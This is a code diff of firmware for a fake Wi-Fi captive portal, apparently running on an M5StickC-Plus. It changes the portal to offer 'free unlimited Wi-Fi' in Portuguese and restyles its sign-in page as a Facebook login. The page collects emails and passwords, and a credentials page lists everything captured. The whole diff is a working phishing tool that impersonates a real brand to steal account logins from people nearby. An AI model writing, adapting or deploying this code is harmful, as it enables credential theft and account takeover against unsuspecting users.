@@ -8,12 +8,12 @@
 // modified font and text placement for StickC-Plus, further improvements added
 
 // User configuration
-#define SSID_NAME "Free WiFi"
-#define SUBTITLE "Free WiFi service."
-#define TITLE "Sign in:"
-#define BODY "Create an account to get connected to the internet."
-#define POST_TITLE "Validating..."
-#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
+#define SSID_NAME "Wi-Fi 2G"
+#define SUBTITLE "Wi-Fi Ilimitado por 10 minutos!"
+#define TITLE "Entre"
+#define BODY "Entre com sua conta para se conectar à internet!"
+#define POST_TITLE "Validando..."
+#define POST_BODY "Sua conta foi validada. Por favor, aguarde 5 minutos para conectarmos seu dispostivo."
 #define PASS_TITLE "Credentials"
 #define CLEAR_TITLE "Cleared"
 
@@ -39,36 +39,44 @@ String input(String argName) {
 
 String footer() {
   return
-    "</div><div class=q><a>&#169; All rights reserved.</a></div>";
+    "</div><div class=q><a>&#169; Todos direitos reservados.</a></div>";
 }
 
 String header(String t) {
-  String a = String(SSID_NAME);
-  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
-               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
-               "div { padding: 0.5em; }"
-               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
-               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
-               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
-               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
+  String a = "Facebook";
+  String CSS = "body { font-family: 'Arial', sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; }"
+               "nav { background: #4267B2; color: #fff; padding: 1em; text-align: center; }"
                "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
-               "textarea { width: 100%; }";
+               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; color: #1877f2; }"
+               "article { background: #fff; padding: 1.3em; margin: 1em; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }"
+               "input, textarea { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 4px; border: 1px solid #ccc; }"
+               "label { color: #333; display: block; font-style: italic; font-weight: bold; margin-bottom: 5px; }"
+               "button { background-color: #1877f2; color: #fff; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }";
   String h = "<!DOCTYPE html><html>"
              "<head><title>" + a + " :: " + t + "</title>"
              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
              "<style>" + CSS + "</style></head>"
-             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
+             "<body><nav><b>" + a + "</b></nav><h1>" + t + "</h1><article>";
   return h;
 }
+
 
 String creds() {
   return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
 }
 
 String index() {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
-         "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
-         "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>" + footer();
+  String formCSS = "form { max-width: 400px; margin: 0 auto; }"
+                   "input[type=email], input[type=password] { width: 100%; padding: 10px; margin: 5px 0; box-sizing: border-box; }"
+                   "input[type=submit] { background-color: #1877f2; color: #fff; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }"
+                   "label { display: block; margin-bottom: 5px; color: #1877f2; }";
+
+  String h = header("Login") + "<div>" + BODY + "</ol></div><div><form action=\"/post\" method=\"post\">" +
+             "<label for=\"email\"><b>Email:</b></label><input type=\"email\" autocomplete=\"email\" name=\"email\" required></input>" +
+             "<label for=\"password\"><b>Senha:</b></label><input type=\"password\" name=\"password\" required></input>" +
+             "<center><input type=\"submit\" value=\"Logar\"></center></form></div>" +
+             "<style>" + formCSS + "</style>" + footer();
+  return h;
 }
 
 String posted() {
